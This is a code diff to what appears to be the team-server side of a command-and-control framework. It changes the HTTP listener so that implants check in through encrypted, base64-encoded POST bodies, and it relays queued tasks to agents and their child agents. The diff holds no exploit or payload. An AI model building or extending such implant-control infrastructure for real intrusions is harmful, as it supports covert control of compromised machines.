@@ -25,14 +25,16 @@ namespace TeamServer.Models
         private ILoggerFactory _loggerFactory;
         private readonly IChangeTrackingService _changeTrackingService;
         private readonly IWebHostService _webHostService;
+        private readonly ICryptoService _cryptoService;
 
-        public HttpListenerController(IAgentService agentService, 
-            IFileService fileService, 
-            IListenerService listenerService, 
-            IBinMakerService binMakerService, 
-            ILoggerFactory loggerFactory, 
+        public HttpListenerController(IAgentService agentService,
+            IFileService fileService,
+            IListenerService listenerService,
+            IBinMakerService binMakerService,
+            ILoggerFactory loggerFactory,
             IChangeTrackingService changeTrackingService,
-            IWebHostService webHostService)
+            IWebHostService webHostService,
+            ICryptoService cryptoService)
         {
             this._agentService=agentService;
             this._fileService = fileService;
@@ -41,6 +43,7 @@ namespace TeamServer.Models
             this._loggerFactory = loggerFactory;
             this._changeTrackingService = changeTrackingService;
             this._webHostService = webHostService;
+            this._cryptoService = cryptoService;
         }
 
 
@@ -54,7 +57,7 @@ namespace TeamServer.Models
             {
                 var fileContent = _webHostService.Get(path);
 
-                if(fileContent == null)
+                if (fileContent == null)
                 {
                     //logger.LogError($"NOT FOUND {fileName} from listener {listener.Name}");
                     Logger.Log($"NOT FOUND {path}");
@@ -72,17 +75,11 @@ namespace TeamServer.Models
             }
         }
 
-        const string AuthorizationHeader = "Authorization";
-
         public async Task<IActionResult> HandleRequest(string relativeUrl)
         {
-            if (this.Request.Headers.ContainsKey(AuthorizationHeader))
+            if (HttpContext.Request.Method == "POST")
             {
-                var agent = this.Request.Headers[AuthorizationHeader].ToString();
-                if (string.IsNullOrEmpty(agent))
-                    return NotFound();
-
-                return await this.HandleImplant(agent);
+                return await this.HandleImplant();
             }
             else
             {
@@ -91,25 +88,66 @@ namespace TeamServer.Models
         }
 
 
-        private async Task<ActionResult> HandleImplant(string id)
+        private async Task<ActionResult> HandleImplant()
         {
-            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.BindPort == this.Request.Host.Port);
+            //var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.BindPort == this.Request.Host.Port);
 
-            var agent = this.CheckIn(id, listener);
+            //var agent = this.CheckIn(id, listener);
 
-            //System.IO.File.AppendAllText("log.log", calledUri + Environment.NewLine);
-            if (HttpContext.Request.Method == "POST")
+            string id = null;
+            var result = new List<MessageResult>();
+            string body;
+            using (var sr = new StreamReader(HttpContext.Request.Body))
+                body = await sr.ReadToEndAsync();
+
+
+            string json = null;
+            try
             {
-                string json;
-                using (var sr = new StreamReader(HttpContext.Request.Body))
-                    json = await sr.ReadToEndAsync();
+                json = _cryptoService.DecryptFromBase64(body);
+                
+            }
+            catch
+            {
+                Logger.Log($"Error decrypting agent messages.");
+                //Decrypt failed
+                return NotFound();
+            }
 
-                var result = JsonConvert.DeserializeObject<List<MessageResult>>(json);
+            try
+            {
+                result = JsonConvert.DeserializeObject<List<MessageResult>>(json);
+            }
+            catch
+            {
+                Logger.Log($"Error deserializing agent messages.");
+                //json in bad format
+                return NotFound();
+            }
+            
 
+            foreach (var messRes in result)
+            {
+                if (messRes.Header.Path.Count() == 1)
+                {
+                    id = messRes.Header.Owner;
+                    break;
+                }
+            }
+
+            if(string.IsNullOrEmpty(id))
+            {
+                //no main agent
+                return NotFound();
+            }
+
+            var messages = new List<MessageTask>();
+            try
+            {
                 foreach (var messRes in result)
                 {
                     var agentId = messRes.Header.Owner;
-                    var messAgent = this.CheckIn(messRes.Header.Owner, listener);
+                    var messAgent = this.CheckIn(messRes.Header.Owner);
 
                     if (messRes.MetaData != null)
                     {
@@ -136,20 +174,34 @@ namespace TeamServer.Models
                     _fileService.SaveResults(messAgent, messRes.Items);
                 }
 
-            }
 
-            var messages = new List<MessageTask>();
-            foreach (var ag in this._agentService.GetAgentToRelay(id))
+                
+                foreach (var ag in this._agentService.GetAgentToRelay(id))
+                {
+                    var mess = ag.GetNextMessage();
+                    if (mess != null)
+                        messages.Add(mess);
+                }
+            }
+            catch(Exception ex)
             {
-                var mess = ag.GetNextMessage();
-                if (mess != null)
-                    messages.Add(mess);
+                System.Diagnostics.Debug.WriteLine(ex.ToString());
+                throw;
             }
 
-            return Ok(messages);
+            var camelSettings = new JsonSerializerSettings { ContractResolver = new Newtonsoft.Json.Serialization.CamelCasePropertyNamesContractResolver() };
+            var ret = JsonConvert.SerializeObject(messages, camelSettings);
+            var enc = this._cryptoService.EncryptAsBase64(ret);
+
+            if (enc.Length == 0)
+            {
+                int i = 0;
+            }
+
+            return Ok(enc);
         }
 
-        private Agent CheckIn(string agentId, Listener listener)
+        private Agent CheckIn(string agentId)
         {
             var agent = this._agentService.GetAgent(agentId);
 
@@ -165,9 +217,6 @@ namespace TeamServer.Models
             }
 
             agent.CheckIn();
-
-            if (listener != null && agent.ListenerId != listener.Id)
-                    agent.ListenerId = listener.Id;
 
             return agent;
         }
